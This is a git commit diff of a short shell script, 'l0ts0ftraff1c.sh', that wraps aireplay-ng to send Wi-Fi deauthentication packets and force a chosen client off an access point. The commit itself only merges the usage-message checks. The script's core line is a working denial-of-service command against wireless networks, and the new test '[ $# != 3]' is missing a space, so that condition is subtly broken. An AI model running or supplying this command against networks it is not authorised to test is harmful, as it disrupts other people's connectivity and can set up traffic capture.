4cc4956a031f00617b8224fc8b3072195dc9db46
ryanrasmuss <ryanrasmuss@gmail.com>
2017-07-29 19:37:25 -0700

    changes to names/ifs

--- l0ts0ftraff1c.sh
+++ l0ts0ftraff1c.sh
@@ -3,11 +3,8 @@
 # **AP is the router
 # **CLIENT is the device to kick off (station column)
 
-if [ $1 == 'h' ]; then
-	echo "Usage: [dauth_pkts#] AP_MAC_ADDRESS CLIENT_MAC"
-	echo "Assumes monitor interface is wlan0mon"
-elif [ $# != 3 ]; then
-	echo "Usage: [dauth_pkts#] AP_MAC_ADDRESS CLIENT_MAC"
+if [ $1 == 'h' ] || [ $# != 3]; then
+	echo "Usage: [dauth_pkts#] [AP_MAC_ADDRESS] [CLIENT_MAC]"
 	echo "Assumes monitor interface is wlan0mon"
 else
 	aireplay-ng --deauth $1 -a $2 -c $3 wlan0mon
